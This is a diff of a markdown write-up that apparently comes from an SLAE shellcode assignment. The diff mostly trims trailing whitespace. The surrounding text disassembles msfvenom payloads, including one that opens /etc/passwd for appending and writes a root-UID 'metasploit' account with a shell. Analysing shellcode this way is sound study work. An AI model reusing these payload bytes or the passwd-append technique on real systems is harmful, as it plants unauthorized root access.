@@ -116,7 +116,7 @@ In this case, the `CALL 0x20` instruction serves two purposes. The first purpose
 In this example, the memory address pushed to the stack as a result of the call instruction is the memory address of `0000001D`. In decimal, this memory address value can be represented as `29`. The first two bytes stored at this memory address are `0x6964`. Examining these bytes reveals that these bytes correlate to the string `id`, or the command that was chosen to be excuted by `execve` when the payload was generated with `msfvenom`.
 
 ```shell
->>> print('\x69\x64')                                      
+>>> print('\x69\x64')
 id
 ```
 
@@ -128,9 +128,9 @@ Using `ndisasm` again to disassemble this shellcode reveals the following:
 
 ```shell
 root@kali:~/SLAE/assignment-5# echo -ne "\x57\x53\x89\xe1\xcd\x80" | ndisasm -b 32 -p intel -                                          
-00000000  57                push edi                                  
-00000001  53                push ebx                                  
-00000002  89E1              mov ecx,esp                              
+00000000  57                push edi
+00000001  53                push ebx
+00000002  89E1              mov ecx,esp
 00000004  CD80              int 0x80
 ```
 
@@ -156,56 +156,56 @@ x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65\
 The command line arguments passed to `ndisasm` specify `x86` (32 bit) architecture and that the output should be formatted in the Intel format. The output of the above command in its entirety is shown below. Note that some assembly instructions are not accurate, specifically instructions following `CALL` instructions. The output will be broken down in to smaller sections later on.
 
 ```nasm
-00000000  31C9              xor ecx,ecx         
+00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
 00000006  58                pop eax
 00000007  CD80              int 0x80
 00000009  6A05              push byte +0x5
 0000000B  58                pop eax
-0000000C  31C9              xor ecx,ecx 
-0000000E  51                push ecx    
-0000000F  6873737764        push dword 0x64777373                            
-00000014  682F2F7061        push dword 0x61702f2f                            
-00000019  682F657463        push dword 0x6374652f                            
-0000001E  89E3              mov ebx,esp                                      
-00000020  41                inc ecx                                          
-00000021  B504              mov ch,0x4                                        
-00000023  CD80              int 0x80                                          
-00000025  93                xchg eax,ebx                                      
-00000026  E828000000        call 0x53                                        
-0000002B  6D                insd      
-0000002C  657461            gs jz 0x90                                        
-0000002F  7370              jnc 0xa1                                          
-00000031  6C                insb      
-00000032  6F                outsd      
-00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a          
-0000003B  736A              jnc 0xa7                                          
-0000003D  3470              xor al,0x70                                      
-0000003F  3449              xor al,0x49                                      
-00000041  52                push edx                                          
-00000042  633A              arpl [edx],di                                    
-00000044  303A              xor [edx],bh                                      
-00000046  303A              xor [edx],bh                                      
-00000048  3A2F              cmp ch,[edi]                                      
-0000004A  3A2F              cmp ch,[edi]                                      
-0000004C  62696E            bound ebp,[ecx+0x6e]                              
-0000004F  2F                das        
-00000050  7368              jnc 0xba                                          
-00000052  0A598B            or bl,[ecx-0x75]                                  
-00000055  51                push ecx                                          
-00000056  FC                cld        
-00000057  6A04              push byte +0x4                                    
-00000059  58                pop eax                                          
-0000005A  CD80              int 0x80                                          
-0000005C  6A01              push byte +0x1                                    
-0000005E  58                pop eax                                          
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80
+00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
+0000002B  6D                insd
+0000002C  657461            gs jz 0x90
+0000002F  7370              jnc 0xa1 
+00000031  6C                insb
+00000032  6F                outsd
+00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
+0000003B  736A              jnc 0xa7
+0000003D  3470              xor al,0x70
+0000003F  3449              xor al,0x49
+00000041  52                push edx
+00000042  633A              arpl [edx],di
+00000044  303A              xor [edx],bh
+00000046  303A              xor [edx],bh
+00000048  3A2F              cmp ch,[edi]
+0000004A  3A2F              cmp ch,[edi]
+0000004C  62696E            bound ebp,[ecx+0x6e]
+0000004F  2F                das
+00000050  7368              jnc 0xba
+00000052  0A598B            or bl,[ecx-0x75]
+00000055  51                push ecx
+00000056  FC                cld
+00000057  6A04              push byte +0x4
+00000059  58                pop eax
+0000005A  CD80              int 0x80
+0000005C  6A01              push byte +0x1
+0000005E  58                pop eax 
 0000005F  CD80              int 0x80
 ``` 
 
 #### Shellcode II: Analysis
 ```nasm
-00000000  31C9              xor ecx,ecx         
+00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
 00000006  58                pop eax
@@ -247,12 +247,12 @@ int open(const char *pathname, int flags);
 Furthermore, the second argument specifies whether the opened file is opened as `O_RDONLY`, `O_WRONLY`, or `O_RDWR` which correlate to read-only, write-only, and read-write access modes. In addition to the access mode flags, zero or more bitwise file creation and file status flags can be set within the second argument that further modify the behavior of `open`. 
 
 ```nasm
-0000000C  31C9              xor ecx,ecx 
-0000000E  51                push ecx    
-0000000F  6873737764        push dword 0x64777373                            
-00000014  682F2F7061        push dword 0x61702f2f                            
-00000019  682F657463        push dword 0x6374652f                            
-0000001E  89E3              mov ebx,esp                                      
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
 ```
 
 The `ECX` register is zeroed out once again with the `XOR` instruction and then is pushed to the stack with a `PUSH` instruction. These null bytes serve to terminate the string which is subsequently pushed to the stack. Examining the twelve bytes pushed to the stack by the three `PUSH` instructions reveals that the bytes correlate to the `/etc//passwd` string and will specify that `open` should open the `/etc/passwd` file.
@@ -282,8 +282,8 @@ An `INC ECX` instruction is used to increase the value in `ECX` by one to hexade
 Recall that additional bitwise file creation and file status flags can be set within the second argument argument of `open`. At this point, the `CX` register contains the value `0x0401` because of the `INC ECX` and `MOV CH, 0x4` instructions. This means that of the 16 bits present in the `CX` register, the lowest order bit (the 0th bit, decimal `2^0 = 1`) and the 10th-lowest order bit (the 10th bit, decimal `2^10 = 1024`) are set. In octal, decimal `1` is `00000001` and decimal `1024` is `00002000`. As seen in the `/usr/include/asm-generic/fcntl.h` file, octal `00000001` specifies the file access mode as `O_WRONLY` which correlates to write-only mode, and octal `00002000` specifies the file status flag `O_APPEND`. This means that once the software interrupt `INT 0x80` instruction is executed, the `/etc/passwd` file will be opened with write access and any written information will be appended to the information already present in the file.
 
 ```nasm
-00000025  93                xchg eax,ebx                                      
-00000026  E828000000        call 0x53                                        
+00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
 ```
 
 After the `open` function, the file descriptor that references the opened file is stored in `EAX`. The `XCHG EAX, EBX` serves to swap the values stored within `EAX` and `EBX`. Therefore, `EBX` now holds the file descriptor returned by `open`. The `CALL 0x53` instruction is used in the same manner as previously explained in the analysis of the `exec` payload. In short, the memory address of the next instruction (`0000002B`) is stored on the stack and execution flow is redirected to the instructions present at `0x53` bytes from the start of the shellcode.
@@ -323,11 +323,11 @@ Using `ndisasm` once again to analyze the instructions present at `00000053` whe
 
 ```shell
 root@kali:~/SLAE/assignment-5# echo -ne "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -b 32 -p intel -
-00000000  59                pop ecx                                        
-00000001  8B51FC            mov edx,[ecx-0x4]                              
-00000004  6A04              push byte +0x4                                
-00000006  58                pop eax                                        
-00000007  CD80              int 0x80                                      
+00000000  59                pop ecx
+00000001  8B51FC            mov edx,[ecx-0x4]
+00000004  6A04              push byte +0x4
+00000006  58                pop eax
+00000007  CD80              int 0x80
 ```
 
 The `POP ECX` instruction stores the `metasploit:Az/dIsj4p4I4IRc:0:0::/:/bin/sh` string in `ECX`. The instruction `MOV EDX, [ECX-0x4]` is used to move the value `0x28` into `EDX`. Since `ECX` now contains the memory address `0000002B` from the original `ndisasm` output, the `MOV EDX, [ECX-0x4]` instruction will result in the contents present at memory address `00000027` from the same output being stored in `EDX`. It can be seen below that the value `0x28` is present at `00000027` in the original `ndisasm` output as part of the operation code for the previously explained `CALL 0x53` instruction.
@@ -345,8 +345,8 @@ ssize_t write(int fd, const void *buf, size_t count);
 From `man 2 write`, the `write` function will write up to `count` bytes from the buffer starting at `buf` to the file referenced by the file descriptor `fd`. The `EBX`, `ECX`, and `EDX` registers have already been set to contain the file descriptor `fd` as returned by `open` that represents the `/etc/passwd` file, a pointer to the string `metasploit:Az/dIsj4p4I4IRc:0:0::/:/bin/sh` in memory as `buf`, and the length of the string `0x28` as `count`, respsectively. The software interrupt `INT 0x80` will call the `write` system call which will add the `metasploit` user to the `/etc/passwd` file as previously explained. 
 
 ```nasm
-00000009  6A01              push byte +0x1                                
-0000000B  58                pop eax                                        
+00000009  6A01              push byte +0x1
+0000000B  58                pop eax
 0000000C  CD80              int 0x80
 ```
 
